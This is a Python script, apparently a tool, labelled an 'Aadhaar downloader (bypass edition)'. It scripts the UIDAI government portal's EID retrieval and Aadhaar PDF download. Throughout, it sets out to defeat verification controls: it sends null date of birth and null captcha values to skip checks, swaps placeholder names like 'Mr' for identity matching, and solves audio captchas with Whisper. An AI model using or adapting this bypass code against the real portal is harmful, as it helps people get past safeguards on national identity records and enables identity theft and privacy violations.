#!/usr/bin/env python3
"""
Automated Aadhaar downloader — standalone script (no cookies, no proxy).

Bypass (bot se):
  - DOB bypass     → dob: null
  - Captcha bypass → captcha: null + captchaTxnId (pehle try)
  - Name skip      → Mr / skip / unknown

Usage:
  python3 aadhar.py
  DOB_BYPASS=0 CAPTCHA_BYPASS=1 python3 aadhar.py
"""

from __future__ import annotations

import base64
import json
import os
import re
import shutil
import uuid

import requests

try:
    import whisper
except ImportError:
    whisper = None  # type: ignore

try:
    from pydub import AudioSegment
except ImportError:
    AudioSegment = None  # type: ignore

# ==============================================================================
# BYPASS CONFIG (env se on/off)
# ==============================================================================
DOB_BYPASS = os.getenv('DOB_BYPASS', '1').strip().lower() in ('1', 'true', 'yes', 'on')
CAPTCHA_BYPASS = os.getenv('CAPTCHA_BYPASS', '1').strip().lower() in ('1', 'true', 'yes', 'on')
SKIP_NAME_TOKENS = frozenset({
    'mr', 'mister', 'skip', 'unknown', 'unk', 'na', 'n/a', 'no', 'none', '?', '-', 'x', 'naam',
})

# ==============================================================================
# SESSION
# ==============================================================================
session = requests.Session()

WHISPER_MODEL = None


def get_headers(req_id: str) -> dict[str, str]:
    return {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://myaadhaar.uidai.gov.in',
        'Referer': 'https://myaadhaar.uidai.gov.in/',
        'User-Agent': (
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
            '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        ),
        'X-Request-ID': req_id,
        'transactionId': req_id,
        'appid': 'MYAADHAAR',
    }


def normalize_name(name: str) -> str:
    t = (name or '').strip().lower().rstrip('.')
    if not t or t in SKIP_NAME_TOKENS:
        return 'Mr'
    return ' '.join(str(name).split()).upper()


def resolve_dob(dob: str) -> str | None:
    if DOB_BYPASS:
        print('[*] DOB bypass ON — sending dob: null')
        return None
    dob = (dob or '').strip()
    if re.fullmatch(r'\d{2}/\d{2}/\d{4}', dob):
        return dob
    print('[!] Invalid DOB format — using null')
    return None


def normalize_captcha(text: str) -> str:
    return re.sub(r'[^a-zA-Z0-9]', '', (text or '').strip().lower())[:8]


def pdf_password(name: str, dob: str | None) -> str:
    name_clean = re.sub(r'\s+', '', normalize_name(name))
    first_4 = name_clean[:4].upper()
    if len(first_4) < 4:
        first_4 = first_4 + ('A' * (4 - len(first_4)))
    if dob and '/' in dob:
        return first_4 + dob.split('/')[-1]
    return first_4


# ==============================================================================
# AUDIO CAPTCHA
# ==============================================================================
def fetch_audio_captcha(headers: dict[str, str]) -> tuple[str | None, str | None]:
    print('[*] Requesting new Audio Captcha...')
    url = 'https://tathya.uidai.gov.in/audioCaptchaService/api/captcha/v3/generation'
    payload = {'captchaLength': '6', 'captchaType': '2', 'audioCaptchaRequired': True}
    try:
        response = session.post(url, headers=headers, json=payload, timeout=45)
        if response.status_code == 200:
            data = response.json()
            audio = data.get('audioBase64') or data.get('audioCaptcha') or data.get('audio')
            txn = data.get('transactionId') or data.get('captchaTxnId') or data.get('txnId')
            if audio and txn:
                print(f'[+] Audio captcha OK — Txn ID: {txn}')
                return str(audio), str(txn)
        print(f'[-] Audio captcha bad response: {response.text[:200]}')
        return None, None
    except Exception as e:
        print(f'[-] Fetch request failed: {e}')
        return None, None


def decode_and_convert_audio(base64_string: str, output_filename: str = 'audio.wav') -> str:
    print('[*] Decoding and converting audio...')
    base64_string = base64_string.strip()
    padding_needed = len(base64_string) % 4
    if padding_needed:
        base64_string += '=' * (4 - padding_needed)

    audio_data = base64.b64decode(base64_string)
    raw_filename = 'temp_raw_audio.mp3'
    with open(raw_filename, 'wb') as f:
        f.write(audio_data)

    try:
        if AudioSegment is None:
            raise RuntimeError('pydub not installed — pip install pydub')
        audio = AudioSegment.from_file(raw_filename)
        audio.export(output_filename, format='wav')
    except Exception as e:
        print(f'[-] Conversion error: {e}')
    if os.path.exists(raw_filename):
        os.remove(raw_filename)
    return output_filename


def audio_to_text(audio_file: str) -> str:
    print('[*] Extracting text using Whisper AI...')
    if whisper is None:
        return 'Error: whisper not installed (pip install openai-whisper)'
    global WHISPER_MODEL
    try:
        if WHISPER_MODEL is None:
            WHISPER_MODEL = whisper.load_model(os.getenv('WHISPER_MODEL', 'base'))
        result = WHISPER_MODEL.transcribe(audio_file, language='en', fp16=False)
        text = str(result.get('text') or '')
        return text.replace(' ', '').replace('.', '').replace(',', '').strip().lower()
    except Exception as e:
        return f'Error: {e}'


def solve_captcha(
    headers: dict[str, str],
    *,
    phase_label: str,
    audio_path: str,
) -> tuple[str, str]:
    """
    Captcha solve order:
      1. captcha:null bypass (txn ke saath)
      2. Whisper audio decode
      3. Manual input
    Returns (captcha_text, captcha_txn_id) — empty captcha means null bypass.
    """
    audio_b64, captcha_txn_id = fetch_audio_captcha(headers)
    if not captcha_txn_id:
        manual = input(f'[>>>] {phase_label} — captcha text (4-8 chars): ').strip()
        return normalize_captcha(manual), ''

    if CAPTCHA_BYPASS:
        print(f'[*] {phase_label} — trying captcha:null bypass (txn={captcha_txn_id})')
        return '', captcha_txn_id

    if audio_b64:
        wav = decode_and_convert_audio(audio_b64, audio_path)
        solved = audio_to_text(wav)
        print(f'[====> {phase_label} Whisper captcha: {solved} <====]')
        if solved and 'Error' not in solved:
            return solved, captcha_txn_id
        if os.path.exists(wav):
            shutil.copy(wav, f'failed_{phase_label.replace(" ", "_")}_{captcha_txn_id}.wav')

    manual = input(f'[>>>] {phase_label} — captcha text (4-8 chars): ').strip()
    return normalize_captcha(manual), captcha_txn_id


def captcha_fields(captcha_text: str, captcha_txn_id: str) -> tuple[str | None, str | None]:
    """Build captcha + captchaTxnId for payload (null bypass support)."""
    if CAPTCHA_BYPASS and not captcha_text:
        return None, captcha_txn_id or None
    cap = normalize_captcha(captcha_text) if captcha_text else None
    return cap, captcha_txn_id or None


def download_captcha_fields(captcha_text: str, captcha_txn_id: str) -> tuple[str | None, str | None]:
    if CAPTCHA_BYPASS and not captcha_text:
        return None, captcha_txn_id or None
    cap = normalize_captcha(captcha_text) if captcha_text else None
    return cap, captcha_txn_id or None


# ==============================================================================
# PHASE 1 — EID RETRIEVAL
# ==============================================================================
def request_eid_otp(
    user_name: str,
    user_dob: str | None,
    user_mobile: str,
    captcha_text: str,
    captcha_txn_id: str,
    headers: dict[str, str],
) -> dict | None:
    cap, txn = captcha_fields(captcha_text, captcha_txn_id)
    label = 'null' if cap is None else cap
    print(f"[*] Requesting EID OTP — captcha: '{label}'")
    url = 'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid'
    payload = {
        'mobileNumber': user_mobile,
        'dob': user_dob,
        'email': None,
        'name': user_name,
        'option': 'EID',
        'otp': None,
        'otpTxnId': None,
        'captchaTxnId': txn,
        'captcha': cap,
        'resendOtp': False,
    }
    try:
        return session.post(url, headers=headers, json=payload, timeout=45).json()
    except Exception as e:
        print(f'[-] EID OTP request failed: {e}')
        return None


def submit_otp_for_eid(
    user_name: str,
    user_dob: str | None,
    user_mobile: str,
    captcha_text: str,
    captcha_txn_id: str,
    otp_txn_id: str,
    otp_code: str,
    headers: dict[str, str],
) -> dict | None:
    cap, txn = captcha_fields(captcha_text, captcha_txn_id)
    print('\n[*] Submitting OTP to retrieve EID...')
    url = 'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid'
    payload = {
        'mobileNumber': user_mobile,
        'email': None,
        'dob': user_dob,
        'name': user_name,
        'option': 'EID',
        'otp': otp_code,
        'otpTxnId': otp_txn_id,
        'captchaTxnId': txn,
        'captcha': cap,
        'resendOtp': False,
    }
    try:
        return session.post(url, headers=headers, json=payload, timeout=45).json()
    except Exception:
        return None


# ==============================================================================
# PHASE 2 — AADHAAR DOWNLOAD
# ==============================================================================
def request_download_otp(
    eid_number: str,
    captcha_text: str,
    captcha_txn_id: str,
    req_id: str,
    headers: dict[str, str],
) -> dict | None:
    cap, txn = download_captcha_fields(captcha_text, captcha_txn_id)
    label = 'null' if cap is None else cap
    print(f"[*] Requesting Download OTP — captcha: '{label}'")
    url = 'https://tathya.uidai.gov.in/unifiedAppAuthService/api/v2/generate/aadhaar/otp'
    payload = {
        'eidNumber': eid_number,
        'idType': 'eid',
        'captchaTxnId': txn,
        'captchaValue': cap,
        'transactionId': req_id,
        'resendOTP': False,
    }
    try:
        return session.post(url, headers=headers, json=payload, timeout=45).json()
    except Exception as e:
        print(f'[-] Download OTP request failed: {e}')
        return None


def submit_download_otp(
    eid_number: str,
    otp_code: str,
    otp_txn_id: str,
    headers: dict[str, str],
) -> dict | None:
    print('\n[*] Submitting final OTP for Aadhaar Download...')
    url = 'https://tathya.uidai.gov.in/downloadAadhaarService/api/aadhaar/download'
    payload = {
        'eid': eid_number,
        'mask': False,
        'otp': otp_code,
        'otpTxnId': otp_txn_id,
    }
    try:
        return session.post(url, headers=headers, json=payload, timeout=45).json()
    except Exception as e:
        print(f'[-] Final Download request failed: {e}')
        return None


def is_success(resp: dict | None) -> bool:
    if not resp:
        return False
    return str(resp.get('status', '')).lower() == 'success'


def invalid_captcha(resp: dict | None) -> bool:
    return 'invalid Captcha' in str(resp or '')


# ==============================================================================
# MAIN
# ==============================================================================
def main() -> None:
    print('=' * 60)
    print('AUTOMATED AADHAAR DOWNLOADER (bypass edition)')
    print('=' * 60)
    print(f'[*] DOB bypass:     {"ON" if DOB_BYPASS else "OFF"}')
    print(f'[*] Captcha bypass: {"ON" if CAPTCHA_BYPASS else "OFF"}')
    print('=' * 60)

    raw_name = input('[>>>] Full Name (as per Aadhaar, or Mr/skip): ').strip()
    u_name = normalize_name(raw_name)
    if u_name == 'Mr' and raw_name.lower().strip('.') in SKIP_NAME_TOKENS:
        print('[*] Name bypass — using Mr')

    u_dob_input = input('[>>>] DOB (DD/MM/YYYY, ignored if DOB bypass ON): ').strip()
    u_dob = resolve_dob(u_dob_input)
    u_mobile = input('[>>>] Mobile Number: ').strip()

    pwd = pdf_password(u_name, u_dob_input if not DOB_BYPASS else None)
    print(f'\n[+] PDF password hint: {pwd}\n')

    # ---- PHASE 1 ----
    print('=' * 60)
    print('PHASE 1: EID RETRIEVAL')
    print('=' * 60)

    phase1_req_id = str(uuid.uuid4())
    phase1_headers = get_headers(phase1_req_id)

    cap1, txn1 = solve_captcha(phase1_headers, phase_label='Phase 1', audio_path='audio_phase1.wav')

    otp_response = request_eid_otp(u_name, u_dob, u_mobile, cap1, txn1, phase1_headers)

    # Bypass fail → Whisper retry
    if invalid_captcha(otp_response) and CAPTCHA_BYPASS and txn1:
        print('[-] captcha:null failed — retry with Whisper...')
        audio_b64, _ = fetch_audio_captcha(phase1_headers)
        if audio_b64:
            wav = decode_and_convert_audio(audio_b64, 'audio_phase1_retry.wav')
            cap1 = audio_to_text(wav)
            if cap1 and 'Error' not in cap1:
                print(f'[====> Retry captcha: {cap1} <====]')
                otp_response = request_eid_otp(u_name, u_dob, u_mobile, cap1, txn1, phase1_headers)

    if not is_success(otp_response):
        print(f'\n[-] EID OTP Request Failed: {otp_response}')
        return

    otp_txn_id = (otp_response.get('responseData') or {}).get('otpTxnId')
    print(f'[+] EID OTP Sent! OTP Txn ID: {otp_txn_id}')

    user_otp = input('\n[>>>] Phase 1 (EID) OTP from mobile: ').strip()
    final_data = submit_otp_for_eid(
        u_name, u_dob, u_mobile, cap1, txn1, otp_txn_id, user_otp, phase1_headers,
    )

    if not is_success(final_data):
        print(f'\n[-] EID Retrieval Failed: {final_data}')
        return

    extracted_eid = (final_data.get('responseData') or {}).get('eidNumber')
    print(f'\n[+] SUCCESS! EID Retrieved: {extracted_eid}')
    if not extracted_eid:
        return

    # ---- PHASE 2 ----
    print('\n' + '=' * 60)
    print('PHASE 2: AADHAAR DOWNLOAD')
    print('=' * 60)

    phase2_req_id = str(uuid.uuid4())
    phase2_headers = get_headers(phase2_req_id)

    cap2, txn2 = solve_captcha(phase2_headers, phase_label='Phase 2', audio_path='audio_phase2.wav')

    dl_otp_response = request_download_otp(extracted_eid, cap2, txn2, phase2_req_id, phase2_headers)

    if invalid_captcha(dl_otp_response) and CAPTCHA_BYPASS and txn2:
        print('[-] Phase 2 captcha:null failed — Whisper retry...')
        audio_b64_2, _ = fetch_audio_captcha(phase2_headers)
        if audio_b64_2:
            wav2 = decode_and_convert_audio(audio_b64_2, 'audio_phase2_retry.wav')
            cap2 = audio_to_text(wav2)
            if cap2 and 'Error' not in cap2:
                dl_otp_response = request_download_otp(
                    extracted_eid, cap2, txn2, phase2_req_id, phase2_headers,
                )

    if not is_success(dl_otp_response):
        print(f'\n[-] Download OTP Failed: {dl_otp_response}')
        return

    dl_otp_txn_id = dl_otp_response.get('txnId')
    print('[+] Download OTP Sent Successfully!')

    user_otp_2 = input('\n[>>>] Phase 2 (Download) OTP from mobile: ').strip()
    download_data = submit_download_otp(extracted_eid, user_otp_2, dl_otp_txn_id, phase2_headers)

    if not is_success(download_data):
        print(f'\n[-] Download Failed: {download_data}')
        with open('debug_download.json', 'w', encoding='utf-8') as f:
            json.dump(download_data or {}, f, indent=4)
        return

    base64_pdf = (download_data.get('data') or {}).get('aadhaarPdf')
    if not base64_pdf:
        print("[-] 'aadhaarPdf' not found in response.")
        with open('debug_download.json', 'w', encoding='utf-8') as f:
            json.dump(download_data, f, indent=4)
        return

    pdf_bytes = base64.b64decode(base64_pdf)
    first_4 = pdf_password(u_name, u_dob_input if not DOB_BYPASS else None)[:4]
    pdf_filename = f'{first_4}_Aadhaar.pdf'
    with open(pdf_filename, 'wb') as f:
        f.write(pdf_bytes)

    print('\n' + '*' * 60)
    print(f"[✔] SUCCESS: PDF saved as '{pdf_filename}'")
    print(f'[✔] Password: {pwd}')
    print('*' * 60)

    for tmp in ('audio_phase1.wav', 'audio_phase2.wav', 'audio_phase1_retry.wav', 'audio_phase2_retry.wav'):
        if os.path.exists(tmp):
            os.remove(tmp)


if __name__ == '__main__':
    main()
